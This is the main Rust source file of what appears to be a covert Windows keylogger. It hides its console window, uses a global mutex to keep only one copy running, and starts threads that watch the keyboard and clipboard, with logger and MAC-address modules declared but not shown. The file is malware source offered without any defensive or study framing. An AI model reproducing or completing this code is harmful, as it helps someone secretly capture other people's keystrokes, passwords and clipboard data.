#![windows_subsystem = "windows"]

mod clipboard;
mod get_mac_addr;
mod key_mapping;
mod keyboard;
mod logger;

use std::mem::ManuallyDrop;
use std::thread;
use windows::core::{PCSTR, PCWSTR};
use windows::Win32::Foundation::BOOL;
use windows::Win32::System::Threading::{CreateMutexA, OpenMutexW, SYNCHRONIZATION_SYNCHRONIZE};

const SINGLE_INSTANCE_MUTEX: &str = "Global\\37890ce2-1027-4623-a280-16ec6ff74239\0";

pub fn main() {
    if let Ok(handle) = unsafe {
        OpenMutexW(
            SYNCHRONIZATION_SYNCHRONIZE,
            BOOL(0),
            PCWSTR::from_raw(
                SINGLE_INSTANCE_MUTEX
                    .encode_utf16()
                    .chain([0])
                    .collect::<Vec<u16>>()
                    .as_ptr(),
            ),
        )
    } {
        if !handle.is_invalid() {
            return;
        }
    }
    if let Ok(handle) = unsafe {
        CreateMutexA(
            None,
            BOOL(1),
            PCSTR::from_raw(
                SINGLE_INSTANCE_MUTEX
                    .as_ptr()
            ),
        )
    } {
        if handle.is_invalid() {
            return;
        }
        let _ = ManuallyDrop::new(handle);

        let mut threads = Vec::new();
        threads.push(thread::spawn(|| keyboard::monitor_keyboard()));
        threads.push(thread::spawn(|| clipboard::monitor_clipboard()));
        for i in threads {
            i.join().expect("failed to spawn thread");
        }
    }
}
